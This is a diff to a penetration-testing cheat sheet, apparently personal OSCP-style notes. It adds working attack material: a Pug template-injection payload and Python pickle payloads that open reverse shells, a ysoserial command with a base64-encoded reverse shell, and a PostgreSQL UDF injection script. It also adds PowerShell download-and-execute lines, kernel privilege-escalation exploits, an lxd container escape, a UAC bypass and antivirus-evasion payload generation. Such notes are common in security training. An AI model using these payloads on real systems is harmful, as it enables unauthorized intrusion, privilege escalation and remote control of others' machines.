@@ -20,6 +20,7 @@
         - `--script=vuln` : Scan vulnerability
         - `-p139,445` : Only scan 139,445 port
         - `-sn` : Host ping scan
+        - `--source-port 4444` : use source port 4444 to scan 
     - Fast UDP Scan
         - `sudo nmap -sUV -T4 -F --version-intensity 0 {IP}`
 - RustScan
@@ -35,6 +36,8 @@
         - Wordlist
             - https://github.com/danTaler/WordLists/blob/master/Subdomain.txt
             - `/usr/share/dnsrecon/subdomains-top1mil.txt`
+    - Get Parameter
+        - https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
 ### Front-End
 #### XSS
 - Cheatsheet
@@ -171,6 +174,16 @@ get_csrf_request.send();
 - Brute force
     - hydra : `hydra -L  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {IP} -s {PORT} http-get /manager/html`
     - msf : `scanner/http/tomcat_mgr_login`
+### Django 
+- `manage.py`
+    - `{appname}`
+        - `settings.py`
+            - INSTALLED_APPS
+            - DATABASES
+        - `urls.py`
+            - urlpatterns
+        - `views`
+            - `{URL Urlpattern's class}`
 ### Werkzeug
 - Debug Page RCE
     - https://github.com/its-arun/Werkzeug-Debug-RCE
@@ -231,13 +244,63 @@ get_csrf_request.send();
       {{/with}}
     {{/with}}
     ```
-
+#### Pug (NodeJS)
+Bypass keyword blacklist
+```
+#{function(){eval(`localLoad=global.process.mainModule.constructor._load;sh=localLoad('child`+`_process').exec('ncat 10.10.10.10 7777 -e /bin/bash')`)}()}
+```
 #### Jinja2 (Python)
 - For flask, Django ......
 - Secret key
     - `{{settings.SECRET_KEY}}`
 
+### Unserialize
+#### Python
+```python=
+import subprocess
+import pickle
 
+class Meow(object):
+    def __reduce__(self):
+        return subprocess.check_output, (['ping', '-c', '1', '10.10.10.10'], )
+
+a = Meow() #
+print(base64.b64encode(pickle.dumps(a)))
+
+
+class Meow(object):
+    def __reduce__(self):
+        return os.system, ("bash -c 'bash -i >& /dev/tcp/192.168.119.130/7877 0>&1'",)
+
+payload = pickle.dumps(Meow())
+payload = base64.b64encode(payload).decode()
+
+```
+
+#### ASP.Net
+##### Json.Net
+```
+.\ysoserial.exe -g  ObjectDataProvider -f Json.Net -c 'ping {My_IP}'
+```
+- Limitation : In `JsonConvert.DeserializeObject`, the `TypeNameHandling` in configuration `JsonSerializerSettings` must not be `None`, can be `Objects`, `Arrays`, `All`, `Auto`
+
+### Java
+- String start with
+    - `\xac\xed\x00\x05` or Base64 (`rO0AB`) 
+- ysoserial
+    - https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
+```dockerfile
+FROM openjdk:11.0.16
+COPY ysoserial-all.jar /root/ysoserial-all.jar
+
+ENTRYPOINT ["java", "-jar", "/root/ysoserial-all.jar"]
+# docker build . -t ysoserial:meow
+```
+- PoC
+    - `docker run --rm ysoserial:meow CommonsCollections3 'touch /tmp/meow'`
+- Reverse shell
+    - `docker run --rm ysoserial:meow CommonsCollections3 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zNS43NC42Ny4xOS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}'`
+    - Note that don't add `-it` in docker
 ### CMS
 #### Wordpress
 - WPScan
@@ -325,6 +388,8 @@ get_csrf_request.send();
     - `SELECT {column} FROM {SCHEMA}.{TABLE}`
 - Conditional time delays
     - `SELECT CASE WHEN ({condition}) THEN pg_sleep(10) ELSE pg_sleep(0) END`
+- Order By
+    - `... ORDER BY (CASE WHEN 1=0 THEN id ELSE length(name) END)`
 ### MSSQL injection
 #### SQL Command
 - `SELECT quotename({col_name}) FROM {DB} FOR XML PATH('')`
@@ -410,6 +475,69 @@ get_csrf_request.send();
 - Localhost
     - `localhost`
     - `127.0.0.1`, `127.0.0.255`, `127.255.254.255`
+### Linux 
+- Current process
+    - `/proc/self/cmdline`
+### Web Socket
+```python
+# pip install websocket-client
+from websocket import create_connection
+ws = create_connection("ws://xxx.xxx.xxx.xxx/xxxx")
+print(ws.recv())
+ws.send("meow")
+```
+### Remote Debugger
+#### Python
+- Remote
+    - `pip install ptvsd`
+- Add following code in source code
+```python=
+import ptvsd
+ptvsd.enable_attach(redirect_output=True)
+ptvsd.wait_for_attach()
+```
+- Rsync code to local
+    - `rsync -avh -e 'ssh -i xxx.pem' ubuntu@10.10.10.10:django`
+- VSCode Auto generate Remote Attach
+    - Modify `connect`, `pathMappings`
+#### Java Jar JDB
+- Remote
+    - `java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=0.0.0.0:9999 -jar file.jar`
+- Local
+    - `rlwrap jdb -attach {IP}:{Port}`
+- Command
+    - Breakpoint
+        - `stop in {com.example.servingwebcontent.classname}.{function name}`
+        - `stop in {com.example.servingwebcontent.classname}:{Line Number}` (JD-gui)
+    - Show variable
+        - `locals` 
+    - Set variable
+        - `set var=value`
+    - Step
+        - `step` next line (into function)
+        - `stepi` next line 
+        - `cont` continue
+#### Node.js
+- Rsync copy code
+- `node --inspect=0.0.0.0:9229 target.js`
+    - VSCode auto generate launch.json
+
+#### .Net dnSpy
+- Backup DLL first
+- Right click DLL
+    - Edit Assembly Attribute
+    - edit`[assembly: Debuggable .....]`) into
+        ```
+        [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default |
+            DebuggableAttribute.DebuggingModes.DisableOptimizations | 
+            DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints |
+            DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+        ```
+    - Compile, File-> Save Module
+- Debug -> Attach to Process
+    - `w3wp.exe`
+- Debug -> Windows -> Modules
+    - Find the DLL
 ## Client Side Attack
 ### Office Macro
 - File type : `docm` or `doc`, doesn't support `docx`
@@ -449,6 +577,7 @@ get_csrf_request.send();
 ### Windows Shell
 - List all data
 	- `dir /a`
+	- `gci -recurse | select fullname` (Powershell)
 - Short name
 	- `dir /x` 
 - Find File
@@ -492,9 +621,11 @@ get_csrf_request.send();
 - [socat](https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-x86)
     - Server : ```socat file:`tty`,raw,echo=0 tcp-listen:{PORT}```
     - Client : `./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}`
+- Reverse SSH
+    - https://github.com/Fahrj/reverse-ssh
 ### Reverse Shell - Windows
 - msfvenom
-	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
+	- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 	    - stage : `shell/reverse_tcp`
 	        - msf `multi/handler` to receive
 	    - stageless : `shell_reverse_tcp`
@@ -514,7 +645,8 @@ get_csrf_request.send();
 
 - Powershell
 	- [Invoke-PowerShellTcp](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
-	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
+	    - `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
+	    - Add `Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {Port}` in the last line, and `powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.35/Invoke-PowerShellTcp1.ps1')`
     - [mini-reverse.ps1](https://gist.github.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1)
         - `powershell IEX (New-Object Net.WebClient).DownloadString('http://10.1.1.246/mini-reverse.ps1')`
 ### File Transmission - Linux
@@ -533,7 +665,7 @@ get_csrf_request.send();
 		- `nc {attacker_ip} {attacker_port} < {file}`
 		- `cat {file} > /dev/tcp/{ip}/{port}`
     - TCP
-        - `nc -q 5 -nlvp {Port} < {file}`
+        - `nc -nlvp {Port} < {file}`
         - `cat<'/dev/tcp/{IP}/{Port}' > {file}`
 - FTP
     - `python3 -m pyftpdlib -p 21 -w`
@@ -593,6 +725,17 @@ get_csrf_request.send();
     - `create function do_system returns integer soname 'lib_sys_udf.so';`
     - `select do_system("{Bash script}");`
         - Not show return 
+#### Logging
+- Conf File
+    - `/etc/my.cnf.d/mysql-server.cnf` (Centos)
+    - `/etc/mysql/my.cnf` (Debian)
+- Add 2 line
+    - `general_log_file=/var/log/mysql/mysql_log.log`
+    - `general_log=1`
+- Restart services
+    - `sudo systemctl restart mysqld`
+- See Log
+    - `tail -f /var/log/mysql/mysql_log.log`
 ### MSSQL
 - Connect
 	- `impacket-mssqlclient -p {port} {UserID}@{IP} -windows-auth`
@@ -637,6 +780,47 @@ get_csrf_request.send();
     - `odat all -s 10.11.1.222 -p 1521 -d XEXDB`
 - RCE
     - `odat-libc2.12-x86_64 ./odat-libc2.12-x86_64 dbmsscheduler -U {Username} -P {Password} -d {SID} -s {IP} --sysdba --exec "{command}" `
+### PostgreSQL
+#### Log
+- `/etc/postgresql/{version}/main/postgresql.conf`
+    - `log_statement = 'all'`
+- `systemctl restart postgresql`
+- `tail -f /var/log/postgresql/postgresql-10-main.log`
+#### UDF
+- https://github.com/martinvw/pg_exec/tree/master/libraries
+- Download `.so` file
+- Put them into `/tmp/pg_exec.so`
+```python=
+def do_query(command):
+    pass # implement by yourself
+loid = 1234
+def delete_lo():
+    command = f"SELECT lo_unlink({loid})"
+    do_query(command)
+delete_lo()
+
+def create_lo():
+    command = f"SELECT lo_create({loid});"
+    do_query(command)
+create_lo()
+
+pg_exec_binary = open("pg_exec.so",'rb').read()
+udf = pg_exec_binary.hex()
+def inject_udf():
+    for i in range(0,int(round(len(udf)/4096))+1): # Done
+        udf_chunk = udf[i*4096:(i+1)*4096]
+        if len(udf_chunk) == 4096:
+            sql = f"INSERT INTO pg_largeobject (loid, pageno, data) values ({loid}, {i}, decode('{udf_chunk}', 'hex'))"
+            do_query(sql)
+inject_udf()
+
+def lo_export():
+    command = "SELECT lo_export(1234,'/tmp/pg_exec.so');"
+    do_query(command)
+lo_export()
+```
+- `CREATE FUNCTION sys(cstring) RETURNS int as '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;`
+- `SELECT sys($$bash -c "bash -i >& /dev/tcp/10.10.10.10/7777 0>&1"$$);`
 ### SMB
 - smb to shell
     - `winexe -U '{username}' //{ip} cmd.exe`
@@ -715,15 +899,34 @@ get_csrf_request.send();
 - [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
 - Compile for old OS
     - `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
-- [CVE-2021-4034 (pkexec) (pwnkit)](https://haxx.in/files/blasty-vs-pkexec.c)
-    - `gcc blasty-vs-pkexec.c -o meow`
-    - `source <(wget https://raw.githubusercontent.com/azminawwar/CVE-2021-4034/main/exploit.sh -O -)`
-- [2016-5195 (dirtycow)](https://www.exploit-db.com/download/40611)
+    - `-static`
+- CVE-2021-4034 (pkexec) (pwnkit)
+    - https://haxx.in/files/blasty-vs-pkexec.c
+        - `gcc blasty-vs-pkexec.c -o meow`
+        - `source <(wget https://raw.githubusercontent.com/azminawwar/CVE-2021-4034/main/exploit.sh -O -)`
+    - https://github.com/ly4k/PwnKit/raw/main/PwnKit
+        - `chmod +x ./PwnKit`
+        - `./PwnKit`
+- [CVE-2016-5195 (dirtycow)](https://www.exploit-db.com/download/40611)
     - ```
-      gcc -pthread 40611.c -o dirtycow
+      gcc -pthread 40611.c -o dirtyc0w
       ./dirtyc0w /etc/passwd "root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash
       "
       ```
+- [CVE-2015-1328 (overlayfs)](https://www.exploit-db.com/download/37292)
+    - Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15
+    - `gcc ofs.c -o ofs`
+    - `./ofs`
+- lxd group
+    - `id` -> user has lxd group
+    - `wget https://github.com/saghul/lxd-alpine-builder/raw/master/alpine-v3.13-x86_64-20210218_0139.tar.gz -O alpine.tar.gz`
+    - `lxc image import alpine.tar.gz --alias alpine`
+    - `lxc init alpine privesc -c security.privileged=true`
+    - `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
+    - `lxc start privesc`
+    - `lxc exec privesc /bin/sh`
+    - `cd /mnt/root ....`
+    
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
     - Linux privileges escalation 
@@ -862,6 +1065,16 @@ iptables -X
     -  `net start upnphost`
 ### Bypass UAC
 - [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
+- [CMSTP UAC Bypass](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
+    - `Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"`
+    - `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))`
+    - `[CMSTPBypass]::Execute("C:\Users\Batman\tshd_windows_amd64.exe -c 10.10.10.10 -p 8787")`
+### Bypass CLM
+- IF powershell `$ExecutionContext.SessionState.LanguageMode` return `ConstrainedLanguage` = Constrained Language Mode, CLM ; `FullLanguage` = No Limit
+- Meterperter
+    - `load powershell`
+    - `powershell_shell`
+    - `$ExecutionContext.SessionState.LanguageMode` -> should return `FullLanguage`
 ### Registry
 - AlwaysInstallElevated
     - If both set to 1
@@ -929,6 +1142,15 @@ iptables -X
 - [cpau](https://www.joeware.net/freetools/tools/cpau/index.htm)
     - `cpau -u {user_name} -p {password} -ex C:\{abs_exe_path} -LWP`
     - Run command with given username and password.
+- Powershell Invoke-Command
+```powershell
+$username = 'USER_NAME'
+$password = 'PASSWORD'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Invoke-command -computername COMPUTER_NAME -credential $credential -scriptblock {cmd.exe /c C:\Users\Public\nc.exe -e cmd.exe 10.1.1.1
+5 8877 }
+```
 - Administrator to System
     - It is a feature
         - `PsExec -i -s cmd.exe`
@@ -988,7 +1210,15 @@ iptables -X
     - Payload : `{raw_file}`
         - `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f raw > {FILE}.raw`
     - DLL Loader : N
-
+- GreatSCT
+    - Must run in x86 kali
+    - `use Bypass`
+    - `msbuild/meterpreter/rev_tcp.py`
+    - `SET LHOST {IP}`
+    - `SET LPORT {PORT}`
+    - `generate`
+    - Get payload xml (Default : `/usr/share/greatsct-output/source/`)
+    - `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe {PATH OF XML}`
 ## Password Crack
 ### Software
 - Hydra
@@ -1001,7 +1231,6 @@ iptables -X
             - `hydra -l {username} -P {path_to_wordlist} {domain_name_without http/s} http{s}-post-form "{/{path}}:username=^USER^&password=^PASS^&data=data:{string_if_fail}"`
         - ftp
             - `hydra -l {username} -P {wordlist} ftp://{IP}`
-
 - Cowbar
     -  `crowbar -b rdp -s {IP}/32 -U {User List} -C {Password List}`
 - John the ripper
@@ -1019,6 +1248,10 @@ iptables -X
     - Crack hash 
         - https://hashcat.net/wiki/doku.php?id=example_hashes
     - `hashcat -m {mode} {hashes.txt} {wordlist.txt}`
+- LUKS
+    - `bruteforce-luks -t 10 -f wordlist.txt -v 5 backup.img`
+    - `sudo cryptsetup open --type luks backup.img {mount_name}`
+    - `sudo mount /dev/mapper/{mount_name} mount_point`
 ### Dictionary
 - rockyou.txt
 - https://github.com/danielmiessler/SecLists
@@ -1026,7 +1259,6 @@ iptables -X
 - Apache Tomcat
     - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
     - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
-
 - Generate Wordlist
     - Cewl
         - `cewl http://{IP}/{PATH} | tee wordlist.txt`
@@ -1050,7 +1282,28 @@ iptables -X
         - `gunzip  {filename.gz}`
 - tcpdump
     - Recv icmp : `sudo tcpdump -i tun0 icmp`
-    - Capture package : `tcpdump -i {interface} -s 65535 -w {file.pcap}``
+    - Capture package : `tcpdump -i {interface} -s 65535 -w {file.pcap}`
+- SSH
+    - No matching host key type found. Their offer `...`
+        - `ssh -o HostKeyAlgorithms=+{ssh-rsa}`
+    - No matching key exchange method found. Their offer `...`
+        - `ssh -o KexAlgorithms=+{diffie-hellman-group1-sha1}`
+    - No matching cipher found. Their offer `...`
+        - `ssh -o Ciphers=+{aes128-cbc}`
+- Zip Path Traversal 
+    - e.g. ATutor 2.2.1 Directory Traversal
+```python
+from io import BytesIO
+import zipfile
+
+f = BytesIO()
+z = zipfile.ZipFile(f,'w',zipfile.ZIP_DEFLATED)
+z.writestr('../../../../../../../tmp/meow','meowmeow')
+z.close()
+
+with open('poc.zip','wb') as fi:
+    fi.write(f.getvalue())
+```
 ### Reverse tunnel forwarding
 - https://book.hacktricks.xyz/tunneling-and-port-forwarding
 - [Chisel](https://github.com/jpillora/chisel) 
@@ -1077,6 +1330,11 @@ iptables -X
     - Proxy
         - `ssh -D 127.0.0.1:{PORT} {USER}@{IP}`
         - socks4, can set to proxychains
+- nc
+    - Suppose 192.168.5.2:987 is ssh, and can only accept 53 port
+        - `ncat -l 1234 --sh-exec 'ncat 192.168.5.2 987 -p 53'`
+            - `-p 53` means use 53 port to send the data
+        - `ssh user@127.0.0.1 -p 1234`
 ## Forensics
 - Unknown files
 	- `file {file_name}`
